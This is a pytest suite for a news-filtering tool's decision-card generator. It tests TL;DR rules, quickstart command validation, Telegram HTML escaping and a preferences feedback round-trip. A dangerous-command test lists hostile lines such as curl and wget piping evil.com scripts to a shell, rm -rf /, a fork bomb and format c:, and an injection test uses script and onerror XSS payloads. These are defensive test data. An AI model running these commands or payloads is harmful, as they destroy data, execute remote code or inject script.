"""tests/test_cards.py
~~~~~~~~~~~~~~~~~~~
Milestone 3 (R2: 1-Minute Decision Card Generator & Preferences Integration) Test Suite.

Tests:
1. TestTLDREnforcement: single-sentence enforcement, active voice, 180 char bounds, protected technical tokens.
2. TestConcreteUseCaseMapping: profile mapping (RTX 4090, local inference, agents, RAG, serendipity) & vague rejection.
3. TestBaselineComparison: known baseline tooling (vLLM, llama.cpp, etc.) with comparative metrics vs vague rejection.
4. TestQuickstartValidator: single-line syntax, approved runner prefixes, balanced quotes, dangerous pattern rejection.
5. TestHardwareAndLicenseStandardization: badge format ({hardware} | {license}), license canonicalization, 4090 standardizing.
6. TestCardRenderingAndSecurity: Markdown contract, Telegram HTML entity escaping, XSS/injection prevention, <= 4096 char bounds.
7. TestPreferencesIntegrationRoundTrip: Full round-trip testing from raw item -> Stage 2 -> Breakthrough -> Feedback
   -> Preferences atomic sync -> Few-shot exemplar retrieval -> Stage 2 prompt calibration.
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any
import pytest

from newsscout.config import Settings
from newsscout.filtering.card_gen import (
    CardValidationError,
    DecisionCardGenerator,
    DecisionCardValidator,
    ValidationResult,
)
from newsscout.filtering.prompts import format_few_shot_calibration
from newsscout.filtering.stage2 import DecisionCardPayload, Stage2Evaluator
from newsscout.storage.db import Database
from newsscout.storage.models import (
    Breakthrough,
    DecisionCard,
    DecisionCardData,
    FeedbackRating,
    RawItem,
    Stage1Evaluation,
    Stage2Category,
)
from newsscout.storage.preferences import PreferencesService


# ============================================================================
# 1. TestTLDREnforcement
# ============================================================================

class TestTLDREnforcement:
    """Tests 1-sentence TL;DR rules: single sentence, <= 180 chars, active voice, protected tokens."""

    def test_valid_single_sentence_accepted(self) -> None:
        text = "Enables native NVFP4 kernel execution for RTX 4090 with zero perplexity loss."
        is_valid, errors = DecisionCardValidator.validate_tldr(text)
        assert is_valid, f"Expected valid TL;DR, got errors: {errors}"
        assert errors == []

    def test_multi_sentence_detected_in_strict_validation(self) -> None:
        text = "Enables native NVFP4 kernel execution. It replaces all existing quantization methods."
        is_valid, errors = DecisionCardValidator.validate_tldr(text)
        assert not is_valid
        assert any("multiple sentences" in err for err in errors)

    def test_auto_repair_extracts_first_sentence(self) -> None:
        generator = DecisionCardGenerator()
        text = "Enables fast inference on 4090. Another sentence here that should be discarded."
        repaired = generator.normalize_tldr(text)
        assert repaired == "Enables fast inference on 4090."
        is_valid, errors = DecisionCardValidator.validate_tldr(repaired)
        assert is_valid, f"Repaired TL;DR should be valid: {errors}"

    def test_technical_tokens_not_falsely_split(self) -> None:
        text = "Accelerates v2.0 inference by 3.5x e.g. on RTX 4090 vs. llama.cpp with zero host overhead."
        is_valid, errors = DecisionCardValidator.validate_tldr(text)
        assert is_valid, f"Technical tokens should not trigger false sentence split: {errors}"

    def test_180_character_limit_enforcement(self) -> None:
        long_text = (
            "Enables highly optimized distributed tensor parallelism across multiple local GPUs with "
            "automated memory management and asynchronous kernel dispatch for large language models "
            "running on RTX 4090 workstations."
        )
        assert len(long_text) > 180
        is_valid, errors = DecisionCardValidator.validate_tldr(long_text)
        assert not is_valid
        assert any("exceeds 180 characters" in err for err in errors)

        # Test auto-repair truncates at word boundary with period
        generator = DecisionCardGenerator()
        repaired = generator.normalize_tldr(long_text, max_chars=180)
        assert len(repaired) <= 180
        assert repaired.endswith(".")
        is_valid, _ = DecisionCardValidator.validate_tldr(repaired)
        assert is_valid

    def test_active_voice_enforcement_and_passive_flagging(self) -> None:
        # Active voice passes
        active = "Accelerates local inference by compiling custom Triton kernels for 4090."
        is_valid, _ = DecisionCardValidator.validate_tldr(active)
        assert is_valid

        # Passive voice fails
        passive_1 = "Inference is enabled by the new kernel for 4090."
        is_valid_1, errors_1 = DecisionCardValidator.validate_tldr(passive_1)
        assert not is_valid_1
        assert any("passive phrasing" in err for err in errors_1)

        passive_2 = "This tool can be used to run local models on 4090."
        is_valid_2, errors_2 = DecisionCardValidator.validate_tldr(passive_2)
        assert not is_valid_2
        assert any("passive phrasing" in err for err in errors_2)

    def test_empty_and_linebreak_rejection(self) -> None:
        is_valid, errors = DecisionCardValidator.validate_tldr("")
        assert not is_valid
        assert any("cannot be empty" in err for err in errors)

        is_valid_lb, errors_lb = DecisionCardValidator.validate_tldr("Enables fast\ninference on 4090.")
        assert not is_valid_lb
        assert any("linebreaks" in err for err in errors_lb)


# ============================================================================
# 2. TestConcreteUseCaseMapping
# ============================================================================

class TestConcreteUseCaseMapping:
    """Tests concrete workflow use case mapping to user tech profile or serendipity domain."""

    def test_core_profile_keywords_pass(self) -> None:
        core_use_cases = [
            "Local agent reasoning on RTX 4090 with 24GB VRAM.",
            "High-throughput RAG indexing with Qdrant and Docling.",
            "Autonomous coding harness using MCP server protocols.",
            "Embedded firmware execution on ESP32 with low-latency C++ control.",
            "Local inference serving with NVFP4 quantization on CUDA 12.",
        ]
        for uc in core_use_cases:
            is_valid, errors = DecisionCardValidator.validate_use_case(uc, category=Stage2Category.CORE)
            assert is_valid, f"Expected valid core use case for '{uc}', got errors: {errors}"

    def test_serendipity_keywords_pass(self) -> None:
        serendipity_cases = [
            "ROS2 robotics control loop running on ARM64 Raspberry Pi edge node.",
            "Neuromorphic spike sensor processing for low-power robotics.",
            "Mamba state-space alternative architecture for sub-quadratic sequence modeling.",
            "Edge AI inference on Hailo NPU for real-time vision loops.",
        ]
        for uc in serendipity_cases:
            is_valid, errors = DecisionCardValidator.validate_use_case(uc, category=Stage2Category.SERENDIPITY)
            assert is_valid, f"Expected valid serendipity use case for '{uc}', got errors: {errors}"

    def test_vague_use_case_rejected(self) -> None:
        vague_cases = [
            "General software tool for various web development tasks.",
            "A nice utility that helps developers manage their projects better.",
            "Cloud-based marketing analytics software for enterprise sales teams.",
        ]
        for uc in vague_cases:
            is_valid, errors = DecisionCardValidator.validate_use_case(uc, category=Stage2Category.CORE)
            assert not is_valid, f"Expected vague use case to fail: '{uc}'"
            assert any("profile" in err for err in errors)

    def test_use_case_too_brief_rejected(self) -> None:
        is_valid, errors = DecisionCardValidator.validate_use_case("Too brief.", category=Stage2Category.CORE)
        assert not is_valid
        assert any("too brief" in err for err in errors)


# ============================================================================
# 3. TestBaselineComparison
# ============================================================================

class TestBaselineComparison:
    """Tests baseline comparison against established tooling with comparative metric terms."""

    def test_valid_baseline_comparisons(self) -> None:
        valid_comparisons = [
            "Outperforms vLLM with 2.5x higher throughput on RTX 4090.",
            "Zero host memory overhead compared to vanilla transformers baseline.",
            "Replaces Ollama with 40% lower latency on local inference.",
            "3x faster vector indexing compared to standard Qdrant baseline.",
            "Drop-in replacement for llama.cpp with reduced VRAM footprint.",
        ]
        for comp in valid_comparisons:
            is_valid, errors = DecisionCardValidator.validate_comparison(comp)
            assert is_valid, f"Expected valid comparison for '{comp}', got errors: {errors}"

    def test_vague_comparison_rejected(self) -> None:
        vague_comparisons = [
            "This tool is really innovative and great for developers.",
            "Much faster than other tools in the market.",  # Has metric 'faster' but no baseline
            "Supports vLLM models in production.",  # Has baseline 'vLLM' but no comparison/metric
        ]
        for comp in vague_comparisons:
            is_valid, errors = DecisionCardValidator.validate_comparison(comp)
            assert not is_valid, f"Expected comparison to fail: '{comp}'"
            assert any("comparison against existing baselines" in err for err in errors)

    def test_comparison_empty_rejected(self) -> None:
        is_valid, errors = DecisionCardValidator.validate_comparison("")
        assert not is_valid
        assert any("cannot be empty" in err for err in errors)


# ============================================================================
# 4. TestQuickstartValidator
# ============================================================================

class TestQuickstartValidator:
    """Tests quickstart command validation, normalization, and security checks."""

    def test_valid_docker_quickstart(self) -> None:
        cmd = "docker run --gpus all -p 8000:8000 vllm/vllm-openai:latest"
        is_valid, errors = DecisionCardValidator.validate_quickstart(cmd)
        assert is_valid, f"Expected valid docker quickstart, got errors: {errors}"

    def test_valid_uvx_quickstart(self) -> None:
        cmd = "uvx --from git+https://github.com/org/repo scout-run --host 0.0.0.0"
        is_valid, errors = DecisionCardValidator.validate_quickstart(cmd)
        assert is_valid, f"Expected valid uvx quickstart, got errors: {errors}"

    def test_valid_pip_quickstart(self) -> None:
        cmd = "pip install --upgrade newsscout"
        is_valid, errors = DecisionCardValidator.validate_quickstart(cmd)
        assert is_valid, f"Expected valid pip quickstart, got errors: {errors}"

    def test_markdown_backticks_stripped_by_generator(self) -> None:
        generator = DecisionCardGenerator()
        raw_cmd = "```bash\ndocker run -p 8000:8000 vllm/vllm-openai:latest\n```"
        normalized = generator.normalize_quickstart(raw_cmd)
        assert normalized == "docker run -p 8000:8000 vllm/vllm-openai:latest"
        is_valid, _ = DecisionCardValidator.validate_quickstart(normalized)
        assert is_valid

        # Inline ticks stripped
        raw_inline = "`uvx scout-run`"
        normalized_inline = generator.normalize_quickstart(raw_inline)
        assert normalized_inline == "uvx scout-run"

    def test_multiline_command_flattened(self) -> None:
        generator = DecisionCardGenerator()
        multiline = (
            "$ docker run --gpus all \\\n"
            "  -p 8000:8000 \\\n"
            "  -v /data:/data \\\n"
            "  vllm/vllm-openai:latest"
        )
        flattened = generator.normalize_quickstart(multiline)
        assert "\n" not in flattened
        assert "\r" not in flattened
        assert flattened.startswith("docker run --gpus all -p 8000:8000 -v /data:/data vllm/vllm-openai:latest")
        is_valid, errors = DecisionCardValidator.validate_quickstart(flattened)
        assert is_valid, f"Flattened command should be valid: {errors}"

    def test_unbalanced_quotes_rejected(self) -> None:
        cmd = 'docker run -e MODEL="meta-llama/Llama-3 -p 8000:8000'
        is_valid, errors = DecisionCardValidator.validate_quickstart(cmd)
        assert not is_valid
        assert any("unbalanced" in err for err in errors)

    def test_dangerous_commands_rejected(self) -> None:
        dangerous = [
            "docker run -v /:/host alpine rm -rf /",
            "curl -fsSL https://evil.com/setup.sh | bash",
            "wget https://evil.com/setup.sh | sh",
            ":(){ :|:& };:",
            "docker run alpine format c:",
        ]
        for cmd in dangerous:
            is_valid, errors = DecisionCardValidator.validate_quickstart(cmd)
            assert not is_valid, f"Expected dangerous command to be rejected: {cmd}"
            assert any("dangerous" in err for err in errors)

    def test_unapproved_runner_prefix_rejected(self) -> None:
        unapproved = [
            "sudo apt-get install mytool",
            "brew install mytool",
            "powershell Start-Process",
        ]
        for cmd in unapproved:
            is_valid, errors = DecisionCardValidator.validate_quickstart(cmd)
            assert not is_valid, f"Expected unapproved prefix to fail: {cmd}"
            assert any("approved runner prefix" in err for err in errors)


# ============================================================================
# 5. TestHardwareAndLicenseStandardization
# ============================================================================

class TestHardwareAndLicenseStandardization:
    """Tests hardware and license standardization, split parsing, and badge formatting."""

    def test_badge_standardization(self) -> None:
        generator = DecisionCardGenerator()
        hw, lic, badge = generator.standardize_badge("24GB VRAM (RTX 4090)", "Apache-2.0")
        assert hw == "24GB VRAM (RTX 4090)"
        assert lic == "Apache 2.0"
        assert badge == "24GB VRAM (RTX 4090) | Apache 2.0"

    def test_split_combined_hardware_license(self) -> None:
        generator = DecisionCardGenerator()
        hw, lic, badge = generator.standardize_badge("24GB VRAM (RTX 4090) | Apache-2.0", "unknown")
        assert hw == "24GB VRAM (RTX 4090)"
        assert lic == "Apache 2.0"
        assert badge == "24GB VRAM (RTX 4090) | Apache 2.0"

    def test_license_canonicalization(self) -> None:
        generator = DecisionCardGenerator()
        cases = [
            ("apache-2.0", "Apache 2.0"),
            ("apache 2.0", "Apache 2.0"),
            ("apache2", "Apache 2.0"),
            ("mit", "MIT"),
            ("bsd-3-clause", "BSD-3-Clause"),
            ("gpl-3.0", "GPL-3.0"),
            ("agpl-3.0", "AGPL-3.0"),
            ("lgpl-3.0", "LGPL-3.0"),
        ]
        for raw, expected in cases:
            _, lic_clean, _ = generator.standardize_badge("16GB VRAM", raw)
            assert lic_clean == expected, f"Expected '{expected}' for raw '{raw}', got '{lic_clean}'"

    def test_hardware_4090_standardization(self) -> None:
        generator = DecisionCardGenerator()
        hw, _, badge = generator.standardize_badge("RTX 4090", "MIT")
        assert hw == "24GB VRAM (RTX 4090)"
        assert badge == "24GB VRAM (RTX 4090) | MIT"


# ============================================================================
# 6. TestCardRenderingAndSecurity
# ============================================================================

class TestCardRenderingAndSecurity:
    """Tests multi-channel rendering (Markdown & Telegram HTML) and security escaping."""

    @pytest.fixture
    def sample_card(self) -> DecisionCard:
        data = DecisionCardData(
            tldr="Accelerates local inference by 3.5x using NVFP4 kernels on RTX 4090.",
            use_case="Local agent execution with 70B models at 32 tokens/sec on 24GB VRAM.",
            comparison="3x lower latency compared to standard FP16 vLLM baseline.",
            quickstart="docker run --gpus all -p 8000:8000 vllm/vllm-openai:latest",
            hardware_requirements="24GB VRAM (RTX 4090)",
            license="Apache 2.0",
        )
        return DecisionCard(
            breakthrough_id=42,
            title="vLLM NVFP4 Acceleration",
            repo_url="https://github.com/vllm-project/vllm",
            breakthrough_score=9.4,
            roi_score=9.1,
            category=Stage2Category.CORE,
            data=data,
        )

    def test_markdown_rendering_contract(self, sample_card: DecisionCard) -> None:
        generator = DecisionCardGenerator()
        rendered = generator.render_markdown(sample_card)

        assert "### vLLM NVFP4 Acceleration" in rendered
        assert "([Repository](https://github.com/vllm-project/vllm))" in rendered
        assert "🎯 CORE BREAKTHROUGH" in rendered
        assert "Score: `9.4/10` | ROI: `9.1/10`" in rendered
        assert "> **TL;DR**: Accelerates local inference by 3.5x using NVFP4 kernels on RTX 4090." in rendered
        assert "* **Workflow Use Case**: Local agent execution" in rendered
        assert "* **Baseline Comparison**: 3x lower latency" in rendered
        assert "```bash\n  docker run --gpus all -p 8000:8000 vllm/vllm-openai:latest\n  ```" in rendered
        assert "* **Hardware Requirements & License**: `24GB VRAM (RTX 4090)` | `Apache 2.0`" in rendered

    def test_telegram_html_entity_escaping(self, sample_card: DecisionCard) -> None:
        generator = DecisionCardGenerator()
        # Add dynamic characters needing escaping
        sample_card.title = "Tool <v2.0> & 'Pro' Mode"
        sample_card.data.quickstart = 'docker run -e FOO="bar&baz" <image>'
        rendered = generator.render_telegram_html(sample_card)

        assert "Tool &lt;v2.0&gt; &amp; &#x27;Pro&#x27; Mode" in rendered
        assert "<code>docker run -e FOO=&quot;bar&amp;baz&quot; &lt;image&gt;</code>" in rendered

    def test_telegram_html_injection_prevention(self, sample_card: DecisionCard) -> None:
        generator = DecisionCardGenerator()
        sample_card.title = "<script>alert('pwned')</script>"
        sample_card.data.use_case = "Injected <img src=x onerror=alert(1)> in use case"
        rendered = generator.render_telegram_html(sample_card)

        assert "<script>" not in rendered
        assert "&lt;script&gt;alert(&#x27;pwned&#x27;)&lt;/script&gt;" in rendered
        assert "<img" not in rendered
        assert "&lt;img src=x onerror=alert(1)&gt;" in rendered

    def test_telegram_message_length_bounded(self, sample_card: DecisionCard) -> None:
        generator = DecisionCardGenerator()
        # Artificially expand use case to 5000 chars
        sample_card.data.use_case = "Local inference on RTX 4090. " * 200
        rendered = generator.render_telegram_html(sample_card, max_chars=4096)

        assert len(rendered) <= 4096
        assert "[Truncated]" in rendered

    def test_composite_validation_helpers(self, sample_card: DecisionCard) -> None:
        result = DecisionCardValidator.validate_card(sample_card.data, category=sample_card.category)
        assert result.is_valid
        assert result.errors == []

        # validate_card_or_raise should not raise on valid card
        DecisionCardValidator.validate_card_or_raise(sample_card.data, category=sample_card.category)

        # Invalidate card
        invalid_data = DecisionCardData(
            tldr="",
            use_case="too short",
            comparison="",
            quickstart="rm -rf /",
            hardware_requirements="",
            license="",
        )
        with pytest.raises(CardValidationError) as exc_info:
            DecisionCardValidator.validate_card_or_raise(invalid_data, category=Stage2Category.CORE)
        assert "cannot be empty" in str(exc_info.value)


# ============================================================================
# 7. TestPreferencesIntegrationRoundTrip
# ============================================================================

class TestPreferencesIntegrationRoundTrip:
    """Tests the complete feedback loop and dynamic calibration round-trip:

    RawItem -> Stage2Evaluator.evaluate_and_persist -> DecisionCard & Breakthrough stored in SQLite
    -> PreferencesService.record_feedback -> Atomic data/preferences.json sync
    -> PreferencesService.get_few_shot_exemplars -> format_few_shot_calibration in prompt.
    """

    @pytest.mark.asyncio
    async def test_decision_card_to_preference_exemplar_roundtrip(
        self,
        migrated_db: Database,
        tmp_path: Path,
    ) -> None:
        # 1. Setup isolated test settings with temporary preferences file
        prefs_file = tmp_path / "data" / "preferences.json"
        settings = Settings(
            database_path=migrated_db.db_path,
            preferences_file=prefs_file,
            gemini_api_key="test_mock_key",
            gemini_model="gemini-3.8-flash",
            few_shot_exemplars_count=3,
        )
        preferences_service = PreferencesService(migrated_db, settings)

        # 2. Insert raw item into SQLite
        raw_item = RawItem(
            source="github_releases",
            source_id="vllm-project/vllm:v0.7.0",
            title="vLLM v0.7.0: Native NVFP4 Kernel Integration",
            url="https://github.com/vllm-project/vllm",
            raw_content="Direct NVFP4 kernel execution inside vLLM for RTX 4090.",
            metadata={"stars": 32000},
        )
        insert_query = """
        INSERT INTO raw_items (source, source_id, title, url, raw_content, metadata_json, ingested_at)
        VALUES (:source, :source_id, :title, :url, :raw_content, :metadata_json, :ingested_at);
        """
        await migrated_db.execute(insert_query, raw_item.to_db_params())
        row = await migrated_db.fetch_one("SELECT * FROM raw_items WHERE source_id = ?", (raw_item.source_id,))
        assert row is not None
        persisted_raw_item = RawItem.from_row(row)

        # 3. Create Stage2Evaluator with mock response producing breakthrough decision card
        class CustomMockClient:
            async def evaluate_candidate(self, title: str, content: str) -> dict[str, Any]:
                return {
                    "breakthrough_score": 9.5,
                    "roi_score": 9.2,
                    "category": "core",
                    "rationale": "High novelty NVFP4 kernel acceleration for RTX 4090.",
                    "card": {
                        "tldr": "Enables native NVFP4 kernel execution inside vLLM with zero perplexity loss.",
                        "use_case": "Local agent execution with 70B models at 35 tokens/sec on 24GB VRAM.",
                        "comparison": "3.5x lower latency compared to standard FP16 vLLM baseline.",
                        "quickstart": "```bash\n$ docker run --gpus all -p 8000:8000 vllm/vllm-openai:latest\n```",
                        "hardware_and_license": "24GB VRAM (RTX 4090) | Apache-2.0",
                    },
                }

        evaluator = Stage2Evaluator(
            db=migrated_db,
            settings=settings,
            preferences_service=preferences_service,
            mock_client=CustomMockClient(),
        )

        # 4. Evaluate and persist candidate
        breakthrough = await evaluator.evaluate_and_persist(persisted_raw_item)
        assert breakthrough is not None
        assert breakthrough.id is not None
        assert breakthrough.category == Stage2Category.CORE
        assert breakthrough.breakthrough_score == 9.5
        assert breakthrough.roi_score == 9.2
        assert "### vLLM v0.7.0" in breakthrough.card_markdown
        assert "docker run --gpus all -p 8000:8000 vllm/vllm-openai:latest" in breakthrough.quickstart
        assert breakthrough.license == "Apache 2.0"

        # 5. Verify SQLite row has normalized card fields
        bt_row = await migrated_db.fetch_one("SELECT * FROM breakthroughs WHERE id = ?", (breakthrough.id,))
        assert bt_row is not None
        assert bt_row["tldr"] == "Enables native NVFP4 kernel execution inside vLLM with zero perplexity loss."
        assert bt_row["hardware_requirements"] == "24GB VRAM (RTX 4090)"
        assert bt_row["license"] == "Apache 2.0"

        # 6. Record user feedback (HIT / Volltreffer)
        feedback = await preferences_service.record_feedback(
            breakthrough_id=breakthrough.id,
            rating=FeedbackRating.HIT,
            notes="Outstanding kernel speedup for local agent workloads",
            telegram_user_id=12345678,
        )
        assert feedback.breakthrough_id == breakthrough.id
        assert feedback.rating == FeedbackRating.HIT

        # 7. Verify atomic sync to preferences.json
        assert prefs_file.exists(), "Preferences JSON file should have been synced"
        prefs_data = json.loads(prefs_file.read_text(encoding="utf-8"))
        assert "exemplars" in prefs_data
        positives = prefs_data["exemplars"]["positive"]
        assert len(positives) >= 1
        matching_exemplar = next((ex for ex in positives if ex["title"] == breakthrough.title), None)
        assert matching_exemplar is not None
        assert matching_exemplar["tldr"] == breakthrough.tldr
        assert matching_exemplar["use_case"] == breakthrough.use_case

        # 8. Fetch few-shot exemplars from PreferencesService
        exemplar_pair = await preferences_service.get_few_shot_exemplars(count=3)
        assert len(exemplar_pair.positive) >= 1
        ex = exemplar_pair.positive[0]
        assert ex.rating == FeedbackRating.HIT
        assert ex.title == breakthrough.title
        assert ex.tldr == breakthrough.tldr

        # 9. Test format_few_shot_calibration prompt injection
        formatted_prompt_block = format_few_shot_calibration(exemplar_pair)
        assert "DYNAMIC FEW-SHOT USER CALIBRATION" in formatted_prompt_block
        assert "RECENT POSITIVE RATINGS (HIT / INSPIRE)" in formatted_prompt_block
        assert breakthrough.tldr in formatted_prompt_block
        assert breakthrough.use_case in formatted_prompt_block
